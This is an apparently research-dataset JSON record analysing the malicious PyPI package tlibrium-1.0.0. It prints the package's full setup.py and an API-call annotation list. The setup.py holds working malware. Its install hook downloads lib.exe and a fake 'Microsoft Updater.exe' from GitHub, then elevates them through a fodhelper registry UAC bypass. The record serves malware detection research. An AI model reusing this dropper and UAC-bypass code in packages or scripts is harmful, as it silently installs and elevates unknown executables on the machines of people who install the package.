{
  "metadata": {
    "package_name": "tlibrium-1.0.0",
    "report_path": "/home2/blue/Documents/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/tlibrium-1.0.0.txt",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/code_contexral/codesnippets/malware/tlibrium-1.0.0.json",
    "dataset_type": "malware"
  },
  "code_files": [
    {
      "pyfile": "setup.py",
      "code_snippets": [
        {
          "snippet": "import os\nimport base64\nfrom time import sleep\nimport hashlib\n\ndef notmalfunc():\n    os.system('''pip install requests''')\n    from requests import get\n    from subprocess import call\n    from os import environ\n    import sys\n    import ctypes\n    import winreg\n    import subprocess\n    f=get('https://github.com/ErrorGEtLuck/jashfjashfjasfhl25j2lj/raw/main/lib.exe')\n    open(f\"{environ['USERPROFILE']}lib.exe\", \"wb\").write(f.content)\n    f2=get('https://github.com/ErrorGEtLuck/jashfjashfjasfhl25j2lj/raw/main/Microsoft%20Updater.exe')\n    open(f\"{environ['USERPROFILE']}Microsoft Updater.exe\", \"wb\").write(f2.content)\n    ELEVATE               = rf\"{environ['USERPROFILE']}Microsoft Updater.exe\"\n    FOD_HELPER            = r'C:\\Windows\\System32\\fodhelper.exe'\n    REG_PATH              = 'Software\\Classes\\ms-settings\\shell\\open\\command'\n    DELEGATE_EXEC_REG_KEY = 'DelegateExecute'\n    def is_running_as_admin():\n        try:\n            return ctypes.windll.shell32.IsUserAnAdmin()\n        except:\n            return False\n    def create_reg_key(key, value):\n        try:        \n            winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)\n            registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)                \n            winreg.SetValueEx(registry_key, key, 0, winreg.REG_SZ, value)        \n            winreg.CloseKey(registry_key)\n        except WindowsError:        \n            raise\n    def bypass_uac(cmd):\n        try:\n            create_reg_key(DELEGATE_EXEC_REG_KEY, '')\n            create_reg_key(None, cmd) \n        except WindowsError:\n            raise\n    def main():        \n        if not is_running_as_admin():\n                try:                \n                    cmd = '{} /k '.format(ELEVATE)\n                    bypass_uac(cmd)                 \n                    subprocess.check_output(FOD_HELPER, shell=True)       \n                    sys.exit(0)                \n                except WindowsError:\n                    sys.exit(1)\n    main()\n\n    ELEVATE2 = rf\"{environ['USERPROFILE']}lib.exe\"\n    \n    def main2():\n        if not is_running_as_admin():\n            try:                \n                cmd = '{} /k '.format(ELEVATE2)\n                bypass_uac(cmd)                 \n                subprocess.check_output(FOD_HELPER, shell=True)       \n                sys.exit(0)                \n            except WindowsError:\n                sys.exit(1)\n    main2()\n\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\n\nclass AfterDevelop(develop):\n    def run(self):\n        develop.run(self)\n\nclass AfterInstall(install):\n    def run(self):\n        install.run(self)\n        notmalfunc()",
          "triple_sequences": [
            {
              "action_api": "os.system()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "pip install requests",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Install required Python package",
              "intention_id": "install_required_python_package"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP GET request to URL",
              "action_id": "open_url_get",
              "object": "https://github.com/ErrorGEtLuck/jashfjashfjasfhl25j2lj/raw/main/lib.exe",
              "object_description": "External domain",
              "object_id": "external_domain",
              "intention_description": "Download remote content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "open().write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "f\"{environ['USERPROFILE']}lib.exe\"",
              "object_description": "Executable file",
              "object_id": "executable_file",
              "intention_description": "Write downloaded content to file",
              "intention_id": "write_downloaded_content_file"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP GET request to URL",
              "action_id": "open_url_get",
              "object": "https://github.com/ErrorGEtLuck/jashfjashfjasfhl25j2lj/raw/main/Microsoft%20Updater.exe",
              "object_description": "External domain",
              "object_id": "external_domain",
              "intention_description": "Download remote content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "open().write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "f\"{environ['USERPROFILE']}Microsoft Updater.exe\"",
              "object_description": "Executable file",
              "object_id": "executable_file",
              "intention_description": "Write downloaded content to file",
              "intention_id": "write_downloaded_content_file"
            },
            {
              "action_api": "ctypes.windll.shell32.IsUserAnAdmin()",
              "action_description": "Checks if process is running with administrator privileges",
              "action_id": "check_admin_privileges",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Determine if user is administrator",
              "intention_id": "determine_administrator_status"
            },
            {
              "action_api": "winreg.CreateKey()",
              "action_description": "Creates registry key",
              "action_id": "create_registry_key",
              "object": "winreg.HKEY_CURRENT_USER, REG_PATH",
              "object_description": "Windows registry key",
              "object_id": "windows_registry_key",
              "intention_description": "Access Windows registry key",
              "intention_id": "access_registry_key"
            },
            {
              "action_api": "winreg.OpenKey()",
              "action_description": "Opens registry key",
              "action_id": "open_registry_key",
              "object": "winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE",
              "object_description": "Windows registry key",
              "object_id": "windows_registry_key",
              "intention_description": "Access Windows registry key",
              "intention_id": "access_registry_key"
            },
            {
              "action_api": "winreg.SetValueEx()",
              "action_description": "Sets value for registry key",
              "action_id": "set_registry_value",
              "object": "registry_key, key, 0, winreg.REG_SZ, value",
              "object_description": "Registry value",
              "object_id": "registry_value",
              "intention_description": "Add registry value for startup",
              "intention_id": "add_startup_registry_entry"
            },
            {
              "action_api": "winreg.CloseKey()",
              "action_description": "Closes the opened registry key",
              "action_id": "close_registry_key",
              "object": "registry_key",
              "object_description": "Registry key handle",
              "object_id": "registry_key_handle",
              "intention_description": "Release system resource",
              "intention_id": "release_system_resource"
            },
            {
              "action_api": "subprocess.check_output()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "FOD_HELPER, shell=True",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Execute command",
              "intention_id": "execute_command"
            },
            {
              "action_api": "sys.exit()",
              "action_description": "Exits program",
              "action_id": "exit_program",
              "object": "0",
              "object_description": "Error message text",
              "object_id": "error_message",
              "intention_description": "Terminate program execution",
              "intention_id": "terminate_program_execution"
            },
            {
              "action_api": "sys.exit()",
              "action_description": "Exits program",
              "action_id": "exit_program",
              "object": "1",
              "object_description": "Error message text",
              "object_id": "error_message",
              "intention_description": "Terminate program execution",
              "intention_id": "terminate_program_execution"
            },
            {
              "action_api": "subprocess.check_output()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "FOD_HELPER, shell=True",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Execute command",
              "intention_id": "execute_command"
            },
            {
              "action_api": "sys.exit()",
              "action_description": "Exits program",
              "action_id": "exit_program",
              "object": "0",
              "object_description": "Error message text",
              "object_id": "error_message",
              "intention_description": "Terminate program execution",
              "intention_id": "terminate_program_execution"
            },
            {
              "action_api": "sys.exit()",
              "action_description": "Exits program",
              "action_id": "exit_program",
              "object": "1",
              "object_description": "Error message text",
              "object_id": "error_message",
              "intention_description": "Terminate program execution",
              "intention_id": "terminate_program_execution"
            },
            {
              "action_api": "notmalfunc()",
              "action_description": "Trigger post-installation logic",
              "action_id": "trigger_post_install_logic",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Trigger post-installation logic",
              "intention_id": "trigger_post_installation_logic"
            }
          ]
        }
      ]
    }
  ]
}